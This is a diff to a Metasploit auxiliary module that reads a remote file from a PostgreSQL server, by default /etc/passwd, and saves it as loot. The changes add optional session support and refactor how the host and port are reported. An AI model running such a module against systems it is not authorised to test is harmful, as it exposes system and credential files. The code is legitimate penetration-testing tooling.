@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Postgres
   include Msf::Auxiliary::Report
+  include Msf::OptionalSession::PostgreSQL
 
   def initialize(info = {})
     super(update_info(info,
@@ -23,7 +24,8 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new('RFILE', [ true, 'The remote file', '/etc/passwd'])
-      ])
+      ]
+    )
 
     deregister_options( 'SQL', 'RETURN_ROWSET' )
   end
@@ -37,6 +39,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
+    self.postgres_conn = session.client if session
     ret = postgres_read_textfile(datastore['RFILE'])
     case ret.keys[0]
     when :conn_error
@@ -44,13 +47,13 @@ class MetasploitModule < Msf::Auxiliary
     when :sql_error
       case ret[:sql_error]
       when /^C58P01/
-        print_error "#{rhost}:#{rport} Postgres - No such file or directory."
-        vprint_status "#{rhost}:#{rport} Postgres - #{ret[:sql_error]}"
+        print_error "#{postgres_conn.address}:#{postgres_conn.port} Postgres - No such file or directory."
+        vprint_status "#{postgres_conn.address}:#{postgres_conn.port} Postgres - #{ret[:sql_error]}"
       when /^C42501/
-        print_error "#{rhost}:#{rport} Postgres - Insufficient file permissions."
-        vprint_status "#{rhost}:#{rport} Postgres - #{ret[:sql_error]}"
+        print_error "#{postgres_conn.address}:#{postgres_conn.port} Postgres - Insufficient file permissions."
+        vprint_status "#{postgres_conn.address}:#{postgres_conn.port} Postgres - #{ret[:sql_error]}"
       else
-        print_error "#{rhost}:#{rport} Postgres - #{ret[:sql_error]}"
+        print_error "#{postgres_conn.address}:#{postgres_conn.port} Postgres - #{ret[:sql_error]}"
       end
     when :complete
       loot = ''
@@ -59,10 +62,10 @@ class MetasploitModule < Msf::Auxiliary
         loot << row.first
       }
       # No idea what the actual ctype will be, text/plain is just a guess
-      path = store_loot('postgres.file', 'text/plain', rhost, loot, datastore['RFILE'])
-      print_good("#{rhost}:#{rport} Postgres - #{datastore['RFILE']} saved in #{path}")
-      vprint_good  "#{rhost}:#{rport} Postgres - Command complete."
+      path = store_loot('postgres.file', 'text/plain', postgres_conn.address, loot, datastore['RFILE'])
+      print_good("#{postgres_conn.address}:#{postgres_conn.port} Postgres - #{datastore['RFILE']} saved in #{path}")
+      vprint_good  "#{postgres_conn.address}:#{postgres_conn.port} Postgres - Command complete."
     end
-    postgres_logout if self.postgres_conn
+    postgres_logout if self.postgres_conn && session.blank?
   end
 end
